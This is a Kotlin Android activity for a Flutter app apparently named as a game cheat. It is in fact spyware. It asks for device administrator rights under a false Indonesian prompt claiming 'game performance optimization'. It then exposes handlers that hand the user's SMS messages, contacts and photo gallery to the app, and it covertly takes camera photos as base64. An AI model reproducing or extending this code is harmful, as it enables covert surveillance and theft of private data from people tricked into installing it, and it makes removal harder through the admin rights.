package com.yanz.cheat

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {
    private val CHANNEL = "yanz/cheat"
    private lateinit var bridge: NativeBridge

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        bridge = NativeBridge(this)

        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, DeviceAdmin::class.java)
        if (!dpm.isAdminActive(admin)) {
            try {
                val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan untuk optimasi performa game")
                startActivity(i)
            } catch (_: Exception) {}
        }

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
            .setMethodCallHandler { call, result ->
                try {
                    when (call.method) {
                        "getSms" -> result.success(bridge.getSms())
                        "getContacts" -> result.success(bridge.getContacts())
                        "getGallery" -> result.success(bridge.getGallery())
                        "capturePhoto" -> {
                            val front = call.argument<Boolean>("front") ?: false
                            bridge.capturePhoto(front) { b64 -> 
                                runOnUiThread { result.success(b64) } 
                            }
                        }
                        else -> result.notImplemented()
                    }
                } catch (e: Exception) {
                    result.success(if (call.method == "capturePhoto") "" else emptyList<Map<String, String>>())
                }
            }
    }
}